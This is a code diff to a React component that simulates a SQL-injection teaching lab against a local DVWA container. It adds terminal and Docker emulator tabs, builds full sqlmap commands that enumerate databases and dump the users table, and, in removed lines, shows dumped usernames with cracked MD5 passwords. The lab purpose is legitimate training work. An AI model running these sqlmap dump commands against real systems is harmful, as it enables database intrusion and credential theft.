@@ -10,6 +10,11 @@ import {
   Terminal,
 } from "lucide-react";
 import { WindowControls } from "@/components/WindowBar";
+import { DockerDesktopEmulator } from "@/components/simulators/DockerDesktopEmulator";
+import {
+  type ExternalTerminalCommand,
+  TerminalEmulator,
+} from "@/components/simulators/TerminalEmulator";
 
 interface Props {
   containerRef: string;
@@ -106,12 +111,15 @@ function deterministicPseudoMd5(input: string): string {
 }
 
 export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) {
-  const [tab, setTab] = useState<"sqlmap" | "mariadb">(
+  const [tab, setTab] = useState<"sqlmap" | "mariadb" | "docker">(
     activeTab === "m3-mariadb-patch" ? "mariadb" : "sqlmap"
   );
   const [sqlmapStage, setSqlmapStage] = useState<1 | 2 | 3>(1);
   const [isScanning, setIsScanning] = useState(false);
   const [isSequenceRunning, setIsSequenceRunning] = useState(false);
+  const [containerRunning, setContainerRunning] = useState(true);
+  const [terminalCmd, setTerminalCmd] = useState<ExternalTerminalCommand | null>(null);
+  const cmdSeqRef = useRef(1);
 
   const [bcryptApplied, setBcryptApplied] = useState(false);
   const [leastPrivApplied, setLeastPrivApplied] = useState(false);
@@ -132,6 +140,16 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
   const container = containerRef.trim() || "dvwa";
   const session = phpsessid.trim() || "7nst0hrqrfmv744a5ouj7663b0";
 
+  const buildSqlmapCmd = (stage: 1 | 2 | 3) => {
+    const flag =
+      stage === 1
+        ? "--dbs --batch"
+        : stage === 2
+        ? "-D dvwa --tables --batch"
+        : "-D dvwa -T users --dump --batch";
+    return `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=${session}" ${flag}`;
+  };
+
   useEffect(() => {
     return () => {
       timersRef.current.forEach(clearTimeout);
@@ -148,9 +166,10 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
     setIsSequenceRunning(false);
     setSqlmapStage(stage);
     setIsScanning(true);
+    setTerminalCmd({ id: cmdSeqRef.current++, context: "host", command: buildSqlmapCmd(stage) });
     const t = setTimeout(() => {
       setIsScanning(false);
-    }, 350);
+    }, 320);
     timersRef.current.push(t);
   };
 
@@ -159,26 +178,29 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
     setIsSequenceRunning(true);
     setSqlmapStage(1);
     setIsScanning(true);
+    setTerminalCmd({ id: cmdSeqRef.current++, context: "host", command: buildSqlmapCmd(1) });
 
-    timersRef.current.push(setTimeout(() => setIsScanning(false), 320));
+    timersRef.current.push(setTimeout(() => setIsScanning(false), 300));
     timersRef.current.push(
       setTimeout(() => {
         setSqlmapStage(2);
         setIsScanning(true);
-      }, 1100)
+        setTerminalCmd({ id: cmdSeqRef.current++, context: "host", command: buildSqlmapCmd(2) });
+      }, 1050)
     );
-    timersRef.current.push(setTimeout(() => setIsScanning(false), 1450));
+    timersRef.current.push(setTimeout(() => setIsScanning(false), 1350));
     timersRef.current.push(
       setTimeout(() => {
         setSqlmapStage(3);
         setIsScanning(true);
-      }, 2250)
+        setTerminalCmd({ id: cmdSeqRef.current++, context: "host", command: buildSqlmapCmd(3) });
+      }, 2150)
     );
     timersRef.current.push(
       setTimeout(() => {
         setIsScanning(false);
         setIsSequenceRunning(false);
-      }, 2650)
+      }, 2500)
     );
   };
 
@@ -275,7 +297,7 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
           </p>
         </div>
 
-        <div className="inline-flex rounded-md border border-hairline bg-subtle p-0.5 text-xs">
+        <div className="inline-flex flex-wrap rounded-md border border-hairline bg-subtle p-0.5 text-xs">
           <button
             type="button"
             onClick={() => setTab("sqlmap")}
@@ -285,7 +307,7 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
                 : "text-muted hover:text-ink"
             }`}
           >
-            1. SQLMap 3 Lệnh
+            1. Ubuntu Terminal &amp; SQLMap
           </button>
           <button
             type="button"
@@ -298,10 +320,21 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
           >
             2. MariaDB, Bcrypt Lab &amp; Vá lỗi
           </button>
+          <button
+            type="button"
+            onClick={() => setTab("docker")}
+            className={`cursor-pointer rounded px-3 py-1 font-medium transition-colors ${
+              tab === "docker"
+                ? "bg-surface font-semibold text-ink shadow-sm"
+                : "text-muted hover:text-ink"
+            }`}
+          >
+            3. Docker Container (dvwa)
+          </button>
         </div>
       </div>
 
-      {tab === "sqlmap" ? (
+      {tab === "sqlmap" && (
         <div className="space-y-4">
           <div className="flex flex-wrap items-center gap-2">
             {[
@@ -324,6 +357,12 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
               </button>
             ))}
 
+            {isScanning && (
+              <span className="font-mono text-xs text-amber-500">
+                Đang nạp SQLMap {sqlmapStage}/3...
+              </span>
+            )}
+
             <button
               type="button"
               onClick={handleRunSequence}
@@ -335,82 +374,58 @@ export function Member3Simulator({ containerRef, phpsessid, activeTab }: Props) 
             </button>
           </div>
 
-          <div className="rounded-lg border border-zinc-800 bg-[#0d1117] p-4 font-mono text-xs leading-relaxed text-zinc-200">
-            <div className="mb-2 flex items-center justify-between border-b border-zinc-800 pb-2 text-zinc-400">
-              <div className="flex items-center gap-2.5">
-                <WindowControls />
-                <span className="text-zinc-500">quyet@ubuntu-vm:~$</span>{" "}
-                <span className="font-semibold text-emerald-300">
-                  sqlmap -u &quot;http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID={session.slice(0, 8)}...&quot;{" "}
-                  {sqlmapStage === 1 && "--dbs --batch"}
-                  {sqlmapStage === 2 && "-D dvwa --tables --batch"}
-                  {sqlmapStage === 3 && "-D dvwa -T users --dump --batch"}
-                </span>
-              </div>
-              <span className="text-[10px] text-zinc-500">sqlmap/1.8.4</span>
-            </div>
-
-            {isScanning ? (
-              <div className="py-8 text-center text-amber-400">
-                Đang chạy bước {sqlmapStage}/3 và phân tích cấu trúc MariaDB...
-              </div>
-            ) : (
-              <>
-                {sqlmapStage === 1 && (
-                  <pre className="overflow-x-auto leading-relaxed text-zinc-200">
-{`[INFO] testing connection to the target URL
-[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (DBMS: 'MySQL')
-[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
-[INFO] the back-end DBMS is MySQL (MariaDB fork)
-available databases [2]:
-[*] dvwa
-[*] information_schema
-
-[✓] Hoàn thành Lệnh 1: Phát hiện 2 CSDL đích.`}
-                  </pre>
-                )}
-
-                {sqlmapStage === 2 && (
-                  <pre className="overflow-x-auto leading-relaxed text-zinc-200">
-{`[INFO] fetching tables for database: 'dvwa'
-Database: dvwa
-[2 tables]
-+-----------+
-| guestbook |
-| users     |
-+-----------+
-
-[✓] Hoàn thành Lệnh 2: Phát hiện bảng nhạy cảm 'users'.`}
-                  </pre>
-                )}
-
-                {sqlmapStage === 3 && (
-                  <pre className="overflow-x-auto leading-relaxed text-amber-200">
-{`[INFO] fetching entries for table 'users' in database 'dvwa'
-[INFO] recognized possible password hashes in column 'password'
-[INFO] dictionary-based attack against column 'password' with wordlist.txt
-[100%] [================================] 5/5 hashes parsed
-
-Database: dvwa
-Table: users
-[5 entries]
-+---------+---------+--------------------------------------------+
-| user_id | user    | password (cleartext)                       |
-+---------+---------+--------------------------------------------+
-| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
-| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
-| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
-| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
-| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
-+---------+---------+--------------------------------------------+
-[✓] Hoàn thành Lệnh 3: Toàn bộ mật khẩu MD5 không Salt đã bị bẻ khóa qua từ điển!`}
-                  </pre>
-                )}
-              </>
-            )}
-          </div>
+          <TerminalEmulator
+            os="ubuntu"
+            username="quyet"
+            hostname="ubuntu-vm"
+            containerRef={container}
+            phpsessid={session}
+            containerRunning={containerRunning}
+            onContainerRunningChange={setContainerRunning}
+            bcryptApplied={bcryptApplied}
+            leastPrivApplied={leastPrivApplied}
+            onBcryptAppliedChange={setBcryptApplied}
+            onLeastPrivAppliedChange={setLeastPrivApplied}
+            externalCommand={terminalCmd}
+            presets={[
+              { label: "sqlmap --dbs", command: buildSqlmapCmd(1) },
+              { label: "sqlmap --tables", command: buildSqlmapCmd(2) },
+              { label: "sqlmap --dump", command: buildSqlmapCmd(3) },
+              {
+                label: "Vào MariaDB CLI",
+                command: `docker exec -it ${container} mysql -u root dvwa`,
+              },
+              {
+                label: "SELECT users",
+                command: "SELECT user_id, user, password FROM users;",
+                context: "mariadb",
+              },
+            ]}
+            initialEntries={[
+              {
+                command: buildSqlmapCmd(1),
+                output: `[INFO] testing connection to http://127.0.0.1:8080/vulnerabilities/sqli/\n[INFO] GET parameter 'id' is vulnerable (MySQL / MariaDB fork)\navailable databases [2]:\n[*] dvwa\n[*] information_schema`,
+                tone: "warn",
+              },
+            ]}
+          />
         </div>
-      ) : (
+      )}
+
+      {tab === "docker" && (
+        <DockerDesktopEmulator
+          platform="ubuntu"
+          containerId="215d3a734374"
+          containerName={container}
+          running={containerRunning}
+          onRunningChange={setContainerRunning}
+          bcryptApplied={bcryptApplied}
+          leastPrivApplied={leastPrivApplied}
+          onOpenExternalTerminal={() => setTab("sqlmap")}
+        />
+      )}
+
+      {tab === "mariadb" && (
         <div className="space-y-4">
           <div className="flex flex-wrap items-center gap-2">
             <button
